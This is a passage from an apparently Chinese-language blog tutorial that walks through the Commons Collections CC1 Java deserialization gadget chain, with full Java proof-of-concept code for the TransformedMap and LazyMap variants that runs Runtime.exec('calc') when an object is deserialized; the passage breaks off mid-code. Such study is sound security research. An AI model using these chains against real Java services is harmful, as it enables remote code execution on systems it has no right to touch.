class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandlerReturnCalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>        Class&lt;?&gt; annotationInvocationhandlerClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationhandlerconstructor = annotationInvocationhandlerClass.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationhandlerconstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">annotationInvocationHandler</span> <span class="hljs-operator">=</span> annotationInvocationhandlerconstructor.newInstance(Target.class, transformedMap);<br>        serialize(annotationInvocationHandler);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408122351114.png" alt="image-20240812235059978"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408122351119.png" alt="image-20240812235112999"></p><p>所以当我们传入<code>Target.class</code>时，我们确保我们的map中存在一个键的值为<code>value</code>即可进入<code>447行</code>的if结构；顺势之下，我们也通过了下面的那个if结构，因为下面的if结构仅是判断我们取出的<code>值</code>是不是<code>memberType</code>类型的实例以及是不是<code>ExceptionProxy</code>类型的实例，均不是即可进入下面的if结构，因为我们的<code>值</code>是value，所以成功进入下面的if结构</p><p>但是到这其实还不能够完成我们弹计算器的功能；因为在<code>AnnotationInvocationHandler</code>类中重写的<code>readObject</code>函数调用的<code>setValues</code>函数中传入的参数不可控，我们需要的应该是传入<code>Runtime</code>对象，然后去获取它的<code>exec</code>方法进行执行；</p><p>为了解决上述这个参数不可控的问题，我们需要介绍两个类，<code>ChainedTransformer</code>和<code>ConstantTransformer</code>来解决问题；</p><ul><li><code>ChainedTransformer</code>的作用和功能</li></ul><p><strong>链式执行</strong>: <code>ChainedTransformer</code> 接受一组 <code>Transformer</code> 对象，然后依次对输入数据应用这些转换<code>transform()</code>操作。每个 <code>Transformer</code> 的输出会作为下一个 <code>Transformer</code> 的输入。</p><ul><li><code>ConstantTransformer</code>的作用和功能</li></ul><p>主要作用是在转换<code>transform()</code>时返回一个预定义的常量值，无论输入是什么。也就是说，不管传递给 <code>ConstantTransformer</code> 的输入对象是什么，它都会忽略输入，始终返回构造时指定的常量值。</p><p>根据以上两个类的功能，我们可以使<code>setValues</code>传入任何参数时，最后调用<code>transform</code>时传入的参数均为<code>Runtime.class</code>，具体实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandlerReturnCalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(r),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><span class="hljs-comment">//        ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class);</span><br><span class="hljs-comment">//        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>        Class&lt;?&gt; annotationInvocationhandlerClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationhandlerconstructor = annotationInvocationhandlerClass.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationhandlerconstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">annotationInvocationHandler</span> <span class="hljs-operator">=</span> annotationInvocationhandlerconstructor.newInstance(Target.class, transformedMap);<br>        serialize(annotationInvocationHandler);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408122359622.png" alt="image-20240812235932481"></p><p>通过下断点一步步跟踪最后可以发现确实如之前预料的一样，最后的参数修改成为<code>Runtime.class</code>，达到修改参数的目的，但是继续运行会发现仍然产生异常；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408130048672.png" alt="image-20240813004818492"></p><p>发现在序列化的过程中产生了异常，这个问题的来源是因为<code>Runtime</code>没有实现<code>serializable</code>不能进行序列化；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408130049886.png" alt="image-20240813004908731"></p><p>我们之前利用过<code>InvokerTransformer</code>进行反射调用任意类的函数，我们也可以通过使用<code>InvokerTransformer</code>反射调用<code>Runtime</code>中的exec函数；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;Runtime&gt; runtimeClass = Runtime.class;<br><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) getRuntime.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>exec.invoke(r, <span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure><p>先熟悉以下上述的反射调用exec函数的代码，我们在修改成<code>InvokerTransformer</code>调用即可；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = &#123;<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br></code></pre></td></tr></table></figure><p>最后得到我们完整的反序列化利用链代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> CC1</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.AnnotationInvocationHandlerReturnCalc.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/8/12 22:03</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandlerReturnCalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>        Class&lt;?&gt; annotationInvocationhandlerClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationhandlerconstructor = annotationInvocationhandlerClass.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationhandlerconstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">annotationInvocationHandler</span> <span class="hljs-operator">=</span> annotationInvocationhandlerconstructor.newInstance(Target.class, transformedMap);<br>        serialize(annotationInvocationHandler);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据最后的利用链代码得出以下的流程图；<br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408130112338.png" alt="image-20240813011247149"></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xquery">/*<br>Gadget chain:<br>ObjectInputStream.readObject()<br>AnnotationInvocationHandler.readObject()<br>MapEntry.setValue()<br>TransformedMap.checkSetValue()<br>ChainedTransformer<span class="hljs-built_in">.transform</span>()<br>ConstantTransformer<span class="hljs-built_in">.transform</span>()<br>InvokerTransformer<span class="hljs-built_in">.transform</span>()<br>Method.invoke()<br>Class.getMethod()<br>InvokerTransformer<span class="hljs-built_in">.transform</span>()<br>Method.invoke()<br>Runtime.getRuntime()<br>InvokerTransformer<span class="hljs-built_in">.transform</span>()<br>Method.invoke()<br>Runtime.exec()<br><br>Requires:<br>commons-collections<br> */<br></code></pre></td></tr></table></figure><blockquote><p>之前我一直在想一个问题，为什么明明 Runtime.class已经能够序列化了还要需要转换成InvokerTransformer的形式，其实根本原因还是Runtime类型的实例不能够序列化，如果我们采用反射的形式去调用getRuntime得到Runtime的实例，无论如何都是没办法序列化的，所以我们才需要通过InvokerTransformer去反射调用，因为InvokerTransformer是实现了Serializable的，能够进行序列化，也能够利用其调用所有类方法的功能实现调用Runtime的exec去命令执行；</p></blockquote><h1 id="三、CommonCollections之LazyMap利用链"><a href="#三、CommonCollections之LazyMap利用链" class="headerlink" title="三、CommonCollections之LazyMap利用链"></a>三、CommonCollections之LazyMap利用链</h1><p>正版的CC1链在TransformMap利用链的利用思路下进行了部分修改</p><ul><li><p>不在使用<code>TransformedMap</code>进行利用，而是采用<code>LazyMap</code>和<code>动态代理</code>技术实现利用链；</p></li><li><p>相同点在于都采用<code>InvokerTransformer</code>进行函数调用命令执行的功能；</p></li></ul><p>利用链的构造方法和之前一致，一步一步查找用法进行利用构造，直接找调用<code>transform</code>的函数方法；</p><h2 id="3-1-LazyMap调用transform函数"><a href="#3-1-LazyMap调用transform函数" class="headerlink" title="3.1 LazyMap调用transform函数"></a>3.1 LazyMap调用transform函数</h2><p>通过查找用法可以看到<code>LazyMap</code>中的<code>get</code>函数调用了<code>transform</code>，照常需要知道<code>factory</code>属性是否可控，设置我们需要的值；</p><p>与此同时，<code>get</code>函数为public属性，可访问，传入参数可控；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408131340288.png" alt="image-20240813134019144"></p><p>在<code>LazyMap</code>中发现一个<code>decorate</code>函数与<code>TransformedMap</code>的<code>decorate</code>函数类似，可以设置<code>factory</code>属性的值，这样我们也就可以指定内容调用<code>transform</code>函数；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408131342148.png" alt="image-20240813134202075"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408131342318.png" alt="image-20240813134256253"></p><p>确定了这些以后，我们即可测试这部分内容是否可以构成利用，实践利用测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyMapReturnCalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, invokerTransformer);<br>        lazyMap.get(r);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408131350497.png" alt="image-20240813135044396"></p><p>目前得到的流程图，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408131423920.png" alt="image-20240813142307844"></p><h2 id="3-2-AnnotationInvocationHandler调用get函数"><a href="#3-2-AnnotationInvocationHandler调用get函数" class="headerlink" title="3.2 AnnotationInvocationHandler调用get函数"></a>3.2 AnnotationInvocationHandler调用get函数</h2><p>此处如果直接查找<code>get</code>函数的用法会有数不胜数的用法，但是在<code>AnnotationInvocationHandler</code>类中的<code>invoke</code>函数中也存在对<code>get</code>函数的调用；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408172057651.png" alt="image-20240817204021293"></p><p>与此同时，<code>AnnotationInvocationHandler</code>类中存在重写<code>readObject</code>函数，也可作为入口类使用；</p><p>现在，关键就在于如何出发<code>invoke</code>函数，但是我们发现该类中实现了<code>InvocationHandler</code>。</p><p>此时，想要调用<code>invoke</code>函数，我们就想到了动态代理。在一个类被代理了以后，通过代理调用该类的方法，就一定会调用该代理类重写<code>invode</code>函数。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408172042051.png" alt="image-20240817204250982"></p><p>在原先的<code>TransformeredMap</code>CC1链的基础之上进行理解，<code>readObject</code>函数作用入口，<code>memberValues</code>属性调用了<code>entrySet()</code>方法，所以我们对<code>memberValues</code>属性进行设置代理，当它调用<code>entrySet()</code>方法时，会进行动态代理，则会触发<code>invode</code>函数。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408172055902.png" alt="image-20240817205512812"></p><p>因此，最终得到以下的反序列化利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyMapCC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title 